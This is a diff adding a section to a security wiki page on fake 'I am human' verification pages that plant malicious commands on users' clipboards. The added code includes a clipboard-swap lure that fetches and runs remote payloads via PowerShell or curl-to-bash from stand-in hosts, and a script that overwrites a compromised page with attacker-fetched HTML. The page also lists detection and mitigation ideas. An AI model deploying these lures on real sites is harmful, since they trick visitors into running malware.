@@ -112,6 +112,76 @@ Blue-teams can combine clipboard, process-creation and registry telemetry to pin
 * Event ID **4663** for file creations under `%LocalAppData%\Microsoft\Windows\WinX\` or temporary folders right before the suspicious 4688 event.
 * EDR clipboard sensors (if present) – correlate `Clipboard Write` followed immediately by a new PowerShell process.
 
+## IUAM-style verification pages (ClickFix Generator): clipboard copy-to-console + OS-aware payloads
+
+Recent campaigns mass-produce fake CDN/browser verification pages ("Just a moment…", IUAM-style) that coerce users into copying OS-specific commands from their clipboard into native consoles. This pivots execution out of the browser sandbox and works across Windows and macOS.
+
+Key traits of the builder-generated pages
+- OS detection via `navigator.userAgent` to tailor payloads (Windows PowerShell/CMD vs. macOS Terminal). Optional decoys/no-ops for unsupported OS to maintain the illusion.
+- Automatic clipboard-copy on benign UI actions (checkbox/Copy) while the visible text may differ from the clipboard content.
+- Mobile blocking and a popover with step-by-step instructions: Windows → Win+R→paste→Enter; macOS → open Terminal→paste→Enter.
+- Optional obfuscation and single-file injector to overwrite a compromised site’s DOM with a Tailwind-styled verification UI (no new domain registration required).
+
+Example: clipboard mismatch + OS-aware branching
+```html
+<div class="space-y-2">
+  <label class="inline-flex items-center space-x-2">
+    <input id="chk" type="checkbox" class="accent-blue-600"> <span>I am human</span>
+  </label>
+  <div id="tip" class="text-xs text-gray-500">If the copy fails, click the checkbox again.</div>
+</div>
+<script>
+const ua = navigator.userAgent;
+const isWin = ua.includes('Windows');
+const isMac = /Mac|Macintosh|Mac OS X/.test(ua);
+const psWin = `powershell -nop -w hidden -c "iwr -useb https://example[.]com/cv.bat|iex"`;
+const shMac = `nohup bash -lc 'curl -fsSL https://example[.]com/p | base64 -d | bash' >/dev/null 2>&1 &`;
+const shown = 'copy this: echo ok';            // benign-looking string on screen
+const real = isWin ? psWin : (isMac ? shMac : 'echo ok');
+
+function copyReal() {
+  // UI shows a harmless string, but clipboard gets the real command
+  navigator.clipboard.writeText(real).then(()=>{
+    document.getElementById('tip').textContent = 'Now press Win+R (or open Terminal on macOS), paste and hit Enter.';
+  });
+}
+
+document.getElementById('chk').addEventListener('click', copyReal);
+</script>
+```
+
+macOS persistence of the initial run
+- Use `nohup bash -lc '<fetch | base64 -d | bash>' >/dev/null 2>&1 &` so execution continues after the terminal closes, reducing visible artifacts.
+
+In-place page takeover on compromised sites
+```html
+<script>
+(async () => {
+  const html = await (await fetch('https://attacker[.]tld/clickfix.html')).text();
+  document.documentElement.innerHTML = html;                 // overwrite DOM
+  const s = document.createElement('script');
+  s.src = 'https://cdn.tailwindcss.com';                     // apply Tailwind styles
+  document.head.appendChild(s);
+})();
+</script>
+```
+
+Detection & hunting ideas specific to IUAM-style lures
+- Web: Pages that bind Clipboard API to verification widgets; mismatch between displayed text and clipboard payload; `navigator.userAgent` branching; Tailwind + single-page replace in suspicious contexts.
+- Windows endpoint: `explorer.exe` → `powershell.exe`/`cmd.exe` shortly after a browser interaction; batch/MSI installers executed from `%TEMP%`.
+- macOS endpoint: Terminal/iTerm spawning `bash`/`curl`/`base64 -d` with `nohup` near browser events; background jobs surviving terminal close.
+- Correlate `RunMRU` Win+R history and clipboard writes with subsequent console process creation.
+
+See also for supporting techniques
+
+{{#ref}}
+clone-a-website.md
+{{#endref}}
+
+{{#ref}}
+homograph-attacks.md
+{{#endref}}
+
 ## Mitigations
 
 1. Browser hardening – disable clipboard write-access (`dom.events.asyncClipboard.clipboardItem` etc.) or require user gesture.
@@ -132,5 +202,6 @@ Blue-teams can combine clipboard, process-creation and registry telemetry to pin
 - [Fix the Click: Preventing the ClickFix Attack Vector](https://unit42.paloaltonetworks.com/preventing-clickfix-attack-vector/)
 - [Pastejacking PoC – GitHub](https://github.com/dxa4481/Pastejacking)
 - [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
+- [The ClickFix Factory: First Exposure of IUAM ClickFix Generator](https://unit42.paloaltonetworks.com/clickfix-generator-first-of-its-kind/)
 
 {{#include ../../banners/hacktricks-training.md}}
